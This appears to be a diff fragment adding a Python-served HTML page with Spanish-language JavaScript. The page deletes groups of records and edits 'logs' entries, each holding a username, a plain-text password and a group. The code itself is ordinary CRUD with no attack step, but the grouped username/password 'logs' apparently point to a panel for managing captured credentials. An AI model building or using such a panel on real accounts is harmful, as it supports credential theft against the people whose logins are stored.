+            async function eliminarGrupoActual() {
+                const grupo = document.getElementById('grupoSelect').value;
+                if (grupo === 'todos') {
+                    alert("Selecciona un grupo específico.");
+                    return;
+                }
+                if (!confirm(`¿Eliminar todos los registros del grupo '${grupo}'?`)) return;
+                const res = await fetch(`/api/grupo/${grupo}`, { method: 'DELETE' });
+                if (res.ok) cargarGruposYLogs();
+                else alert("Error al eliminar grupo");
+            }
+
+            function abrirModal(id, usuario, contra, grupo) {
+                document.getElementById('editId').value = id;
+                document.getElementById('editUsuario').value = usuario;
+                document.getElementById('editContra').value = contra;
+                document.getElementById('editGrupo').value = grupo;
+                document.getElementById('editModal').style.display = 'flex';
+            }
+
+            function cerrarModal() {
+                document.getElementById('editModal').style.display = 'none';
+            }
+
+            async function guardarEdicion() {
+                const id = document.getElementById('editId').value;
+                const usuario = document.getElementById('editUsuario').value;
+                const contra = document.getElementById('editContra').value;
+                const grupo = document.getElementById('editGrupo').value;
+
+                const res = await fetch(`/api/logs/${id}`, {
+                    method: 'PUT',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ usuario, contra, grupo })
+                });
+                if (res.ok) {
+                    cerrarModal();
+                    cargarGruposYLogs();
+                } else {
+                    alert("Error al actualizar");
+                }
+            }
+        </script>
+    </body>
+    </html>
+    """
+    return HTMLResponse(content=html_content)
